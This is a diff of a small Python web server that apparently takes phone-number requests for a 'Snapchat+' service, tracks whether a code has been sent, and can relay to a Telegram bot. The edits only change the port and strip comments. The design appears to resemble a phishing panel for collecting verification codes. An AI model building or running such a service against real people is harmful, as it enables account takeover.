@@ -2,13 +2,12 @@ import json, os, time, threading, urllib.request
 from http.server import HTTPServer, SimpleHTTPRequestHandler
 from urllib.parse import urlparse
 
-PORT = int(os.environ.get("PORT", 10000))
+PORT = int(os.environ.get("PORT", 3000))
 SITE_DIR = os.path.dirname(os.path.abspath(__file__))
 DATA_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data.json")
 
 SERVICES = {"snap": "Snapchat+"}
 
-# Telegram (optionnel, rempli sur Render si besoin)
 TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
 TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")
 
@@ -124,13 +123,10 @@ class Server(SimpleHTTPRequestHandler):
 
     def do_GET(self):
         p = urlparse(self.path).path
-
-        # Racine -> page d'accueil
         if p == "/":
             self.path = "/choose.html"
             return super().do_GET()
 
-        # Statut d'une demande
         if p.startswith("/api/status/"):
             rid = p.split("/")[-1]
             r = requests_db.get(rid)
@@ -142,7 +138,6 @@ class Server(SimpleHTTPRequestHandler):
                 return self._json({"ok": True, "status": "code_sent", "at": r["code_sent_at"]})
             return self._json({"ok": True, "status": "pending"})
 
-        # Fichiers statiques
         super().do_GET()
 
     def do_POST(self):
@@ -156,7 +151,6 @@ class Server(SimpleHTTPRequestHandler):
         if p == "/api/request":
             rid = d.get("rid", "")
             phone = norm_phone(d.get("phone"))
-
             if phone and phone in blocked_phones:
                 requests_db[rid] = {
                     "data": d, "state": "done", "by": "block",
@@ -195,5 +189,5 @@ if __name__ == "__main__":
     if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
         print("[telegram] active")
     else:
-        print("[telegram] desactive (mets TELEGRAM_BOT_TOKEN et TELEGRAM_CHAT_ID sur Render)")
+        print("[telegram] desactive")
     HTTPServer(("0.0.0.0", PORT), Server).serve_forever()
